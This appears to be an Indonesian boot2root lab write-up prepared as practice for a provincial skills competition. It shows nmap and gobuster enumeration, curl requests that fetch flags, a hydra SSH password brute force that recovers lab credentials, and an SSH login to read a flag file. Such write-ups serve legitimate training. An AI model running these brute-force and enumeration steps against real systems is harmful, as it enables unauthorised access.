# Pendahuluan
Write ini dibuat untuk latihan saya lks provinsi jawa barat tahun 2026, dengan materi boot2root dimana boot2root itu adalah tantangan atau kopotensi dimana mencari kerentanan atau mengambil hak akses sepenuh nya.
## Service Level Enumeration
### Sumary 
Service Level Enumeration dalam konteks keamanan siber adalah proses sistematis untuk memindai, mengidentifikasi, dan mencatat daftar layanan, aplikasi, port terbuka, serta versi perangkat lunak yang berjalan pada sebuah sistem atau jaringan.
### PoC
Nmap https://192.168.2.10 :
perintah :
```
nmap -sV -sC -p- 192.168.2.10 -oN scan.txt
```
Output :
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# nmap -sV -sC -p- 192.168.2.10 -oN scan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 20:31 +0700
Nmap scan report for 192.168.2.10
Host is up (0.0053s latency).
Not shown: 65426 filtered tcp ports (no-response), 103 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 d6:ad:fe:09:9c:9e:11:73:2d:5d:ee:41:db:07:f7:ca (ECDSA)
|_  256 64:c8:f2:2f:72:6e:33:aa:9e:e7:14:5e:5c:98:7e:f4 (ED25519)
53/tcp   open  domain  (generic dns response: NOTIMP)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
9116/tcp open  http    Golang net/http server
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Mon, 25 May 2026 13:33:44 GMT
|     Content-Length: 807
|     Content-Type: text/html; charset=utf-8
|     <html>
|     <head>
|     <title>SNMP Exporter</title>
|     <style>
|     label{
|     display:inline-block;
|     width:75px;
|     form label {
|     margin: 10px;
|     form input {
|     margin: 10px;
|     </style>
|     </head>
|     <body>
|     <h1>SNMP Exporter</h1>
|     <form action="/snmp">
|     <label>Target:</label> <input type="text" name="target" placeholder="X.X.X.X" value="1.2.3.4"><br>
|     <label>Module:</label> <input type="text" name="module" placeholder="module" value="if_mib"><br>
|     <input type="submit" value="Submit">
|     </form>
|_    <p><a href="/config">Config</a></p>
|_http-title: SNMP Exporter
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.98%I=7%D=5/25%Time=6A144FBD%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,E,"\0\x0c\0\x06\x81\x84\0\0\0\0\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9116-TCP:V=7.98%I=7%D=5/25%Time=6A144FB8%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,39C,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
SF:2025\x20May\x202026\x2013:33:44\x20GMT\r\nContent-Length:\x20807\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\n\r\n<html>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20<title>SNMP\x20Exporter</title>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20label{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:display:inline-block;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:width:75px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20form\x20label\x20{\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x2010px;\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20form\x20input\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x2010px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</head>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20<h1>SNMP\x20Exporter</h1>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20<form\x20action=\"/snmp\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20<label>Target:</label>\x20<input\x20type=\"text\
SF:"\x20name=\"target\"\x20placeholder=\"X\.X\.X\.X\"\x20value=\"1\.2\.3\.
SF:4\"><br>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<label>Module
SF::</label>\x20<input\x20type=\"text\"\x20name=\"module\"\x20placeholder=
SF:\"module\"\x20value=\"if_mib\"><br>\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20<input\x20type=\"submit\"\x20value=\"Submit\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</form>\n\t\t\t\t\t\t<p><a\x20hr
SF:ef=\"/config\">Config</a></p>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20</b");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.72 seconds
```
Gobuster
Cari directory yang kebuka menggunakan gobuster dengan perintah :
```
gobuster dir -u http://192.168.2.10 -w /usr/share/wordlists/dirb/common.txt
```
Output 
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# gobuster dir -u http://192.168.2.10 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.hta                 (Status: 403) [Size: 277]
company              (Status: 301) [Size: 314] [--> http://192.168.2.10/company/]
index.html           (Status: 200) [Size: 10671]
robots.txt           (Status: 200) [Size: 28]
server-status        (Status: 403) [Size: 277]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
Terdapat sebuah directory yaitu Robots.txt dan company yang terbuka.
cek menggunkan curl
perintah :
```
curl http://192.168.2.10/robots.txt
curl http://192.168.2.10/compony
```
Output
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# curl http://192.168.2.10/robots.txt
FLAG{enum_s3rv1c3_jb2026_1}

┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# curl http://192.168.2.10/compony
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 192.168.2.10 Port 80</address>
</body></html>
```
### Flag
FLAG{enum_s3rv1c3_jb2026_1}

## CVE Exploitation – Local FileInclusion (LFI)
## Summary 
CVE adalah singkatan dari Common Vulnerabilities and Exposures. Ini adalah daftar standar publik yang mengidentifikasi dan melacak kerentanan keamanan siber yang ditemukan pada perangkat lunak atau hardware tertentu. 
### PoC
Cari directory yang menyembunyikan flag menggunakan tools gobuster dengan wordlist sama, contoh perintah :
```
gobuster dir -u http://192.168.2.10/company -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Output
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# gobuster dir -u http://192.168.2.10/company -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.10/company
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
pages                (Status: 301) [Size: 320] [--> http://192.168.2.10/company/pages/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
Cek menggunakan curl contoh perintah :
```
curl http://192.168.2.10/company/pages
```
Output 
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov]
└─# curl http://192.168.2.10/company/pages/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /company/pages</title>
 </head>
 <body>
<h1>Index of /company/pages</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/company/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="home.php">home.php</a></td><td align="right">2026-05-25 07:27  </td><td align="right"> 52 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="secret.php">secret.php</a></td><td align="right">2026-05-25 07:28  </td><td align="right"> 24 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.52 (Ubuntu) Server at 192.168.2.10 Port 80</address>
</body></html>
```
Terdapat 2 file dan kita pilih yang sercet.php, cek menggunakan curl contoh perintah :
```
curl http://192.168.2.10/company/pages/secret.php
```
Output
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov]
└─# curl http://192.168.2.10/company/pages/secret.php
FLAG{lf1_r3ad_jb2026_3}
```
### Flag 
FLAG{lf1_r3ad_jb2026_3}

## Data Exfiltration – SSH Initial Access
### Summary
Data Exfiltration – SSH Initial Access adalah rantai serangan siber di mana peretas pertama kali menyusup ke dalam jaringan korban menggunakan celah pada protokol SSH (langkah Initial Access), lalu mencuri serta memindahkan data sensitif tersebut keluar dari sistem (langkah Data Exfiltration).
### PoC
Gunakan hydra untuk brute force ssh dengan perintah :
```
hydra -L username.txt -P wordlist_password_500.txt ssh://192.168.2.10
```
Ouput
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# hydra -L username.txt -P wordlist_password_500.txt ssh://192.168.2.10
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 22:41:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 501 login tries (l:1/p:501), ~32 tries per task
[DATA] attacking ssh://192.168.2.10:22/
[22][ssh] host: 192.168.2.10   login: lowuser   password: P@ssw0rd123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 22:41:26
```
SSH server tersebut dengan credensial yang telah didapat : user lowuser, password : P@ssw0rd123 ssh dengan perintah tersebut.
```
ssh lowuser@192.168.2.10
```
Output
```
┌──(root㉿LAPTOP-51J7O26L)-[/home/al/lksprov/Boot2Root]
└─# ssh lowuser@192.168.2.10
lowuser@192.168.2.10's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May 25 03:44:55 PM UTC 2026

  System load:  0.02               Processes:               133
  Usage of /:   32.6% of 29.36GB   Users logged in:         1
  Memory usage: 47%                IPv4 address for enp0s3: 192.168.2.10
  Swap usage:   14%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

15 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

New release '24.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Mon May 25 12:04:47 2026 from 192.168.120.188
lowuser@ubuntu-server:~$
```
Dan cari flag di beberapa directory tetapi saya disini langsung menemukan flag nya dengan perintah ls dan cat.
Output
```
lowuser@ubuntu-server:~$ ls
user.txt
lowuser@ubuntu-server:~$ cat user.txt
FLAG{ssh_acc3ss_jb2026_4}
lowuser@ubuntu-server:~$
```
### Flag 
FLAG{ssh_acc3ss_jb2026_4}
